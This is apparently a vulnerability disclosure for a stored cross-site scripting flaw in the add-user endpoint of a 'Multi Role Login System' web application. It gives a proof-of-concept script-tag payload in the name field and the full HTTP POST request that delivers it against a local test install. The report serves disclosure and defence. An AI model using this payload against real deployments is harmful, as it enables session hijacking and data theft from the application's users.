# Stored XSS Vulnerability in Multi Role Login System

### Title: Stored XSS Vulnerability in Multi Role Login System
### Affected Component: /endpoint/add-user.php
### CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation)

### Impact:
The web application has a stored cross-site scripting (XSS) vulnerability in the create user feature. An attacker can insert malicious JavaScript into the "name" parameter, which gets displayed when updating profile details. As a result, when other users view the affected name, the script runs in their browsers, potentially leading to session hijacking, data theft, or other malicious activities.

### Proof of Concept (POC):
Attackers exploit stored XSS by injecting malicious JavaScript into the "name" field during creation of user. For instance, submitting the payload `x<script>alert('PwnedPixel')</script>` displays an alert box upon viewing. This shows that arbitrary scripts can be successfully executed within the application.

#### HTTP Request:
```
POST /multi-role-login-system/endpoint/add-user.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/multi-role-login-system/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

name=x<script>alert('PwnedPixel')</script>&role=admin&username=test&password=test123&confirmPassword=test123

```

### Proof with Screenshot:
![image](https://github.com/user-attachments/assets/be90acbc-838a-46fa-aed8-2eb7a07842ad)


## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
